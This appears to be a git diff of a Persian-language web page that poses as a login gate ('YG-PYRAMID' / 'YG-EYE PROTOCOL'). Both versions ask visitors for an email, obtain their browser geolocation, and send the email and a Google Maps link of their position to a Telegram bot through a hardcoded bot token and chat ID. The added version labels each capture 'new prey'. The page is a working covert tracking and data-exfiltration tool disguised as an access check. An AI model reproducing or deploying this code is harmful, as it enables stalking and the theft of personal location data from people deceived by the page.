@@ -2,68 +2,48 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درگاه امنیتی YG-PYRAMID</title>
+    <title>YG-PYRAMID</title>
     <style>
-        body { background-color: #050505; color: #d4af37; font-family: 'Tahoma', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; border: 2px solid #d4af37; padding: 40px; border-radius: 15px; background: #111; box-shadow: 0 0 30px rgba(212, 175, 55, 0.5); width: 320px; }
-        input { padding: 12px; width: 90%; margin-bottom: 20px; border-radius: 5px; border: 1px solid #d4af37; background: #222; color: #fff; text-align: center; }
-        .btn { background-color: #d4af37; color: #000; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:hover { background-color: #fff; box-shadow: 0 0 15px #fff; }
-        #status { margin-top: 20px; font-size: 0.8em; color: #00ff00; }
-        #access-denied { display: none; color: #ff4444; }
+        body { background: #000; color: #d4af37; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .box { border: 2px solid #d4af37; padding: 20px; display: inline-block; border-radius: 10px; }
+        input { padding: 10px; margin: 10px; border-radius: 5px; border: none; }
+        button { padding: 10px 20px; background: #d4af37; border: none; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div class="container" id="main-box">
-        <h1>YG-PYRAMID</h1>
-        <p>پروتکل هوش مصنوعی ارباب یحیی</p>
-        <input type="email" id="user-email" placeholder="ایمیل خود را وارد کنید">
-        <button class="btn" onclick="startProtocol()">ورود به سیستم</button>
-        <div id="status"></div>
-    </div>
-
-    <div id="access-denied" style="text-align: center;">
-        <h1>خوردیم به دیوار و برگشتیم!</h1>
-        <p>دسترسی شما به دلیل عدم تایید مکان مسدود شد.</p>
+    <div class="box">
+        <h1>YG-EYE PROTOCOL</h1>
+        <p>لطفاً برای ورود ایمیل خود را تایید کنید</p>
+        <input type="email" id="email" placeholder="Email...">
+        <br>
+        <button onclick="check()">ورود به سیستم</button>
+        <p id="msg"></p>
     </div>
 
     <script>
-        const BOT_TOKEN = "8216584091:AAE5fPf-wUV1_Na87mEKB15qXyXqilNvpbo";
-        const CHAT_ID = "8496996244";
-
-        function startProtocol() {
-            const email = document.getElementById('user-email').value;
-            if (!email) { alert("وارد کردن ایمیل الزامی است."); return; }
+        function check() {
+            const email = document.getElementById('email').value;
+            if(!email) { alert("ایمیل را وارد کنید"); return; }
             
-            document.getElementById('status').innerText = "در حال هماهنگی با پروتکل هرم...";
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => sendToTelegram(pos, email),
-                    (err) => {
-                        document.getElementById('main-box').style.display = 'none';
-                        document.getElementById('access-denied').style.display = 'block';
-                        document.body.style.backgroundColor = '#200000';
-                    }
-                );
-            }
-        }
+            document.getElementById('msg').innerText = "در حال پردازش...";
 
-        function sendToTelegram(position, email) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const text = `🚨 ورود جدید به هرم!\n\n👤 کاربر: ${email}\n📍 موقعیت: ${mapUrl}\n🔑 وضعیت: هویت تایید شد.`;
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const token = "8216584091:AAE5fPf-wUV1_Na87mEKB15qXyXqilNvpbo";
+                const chat = "8496996244";
+                
+                // اصلاح لینک نقشه برای تلگرام
+                const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+                const text = "🚨 شکار جدید!\n📧 ایمیل: " + email + "\n📍 مکان: " + mapLink;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
-            .then(() => {
-                document.getElementById('main-box').innerHTML = `
-                    <h2 style="color: #00ff00;">خوش آمدید</h2>
-                    <p>هویت شما ثبت شد.</p>
-                    <p>در حال اتصال به مغز YG-EYE...</p>
-                `;
+                fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(text))
+                .then(() => {
+                    document.getElementById('msg').innerText = "دسترسی تایید شد. خوش آمدید.";
+                });
+
+            }, function(err) {
+                alert("خطا: برای ورود باید اجازه دسترسی به مکان (Location) را بدهید.");
             });
         }
     </script>
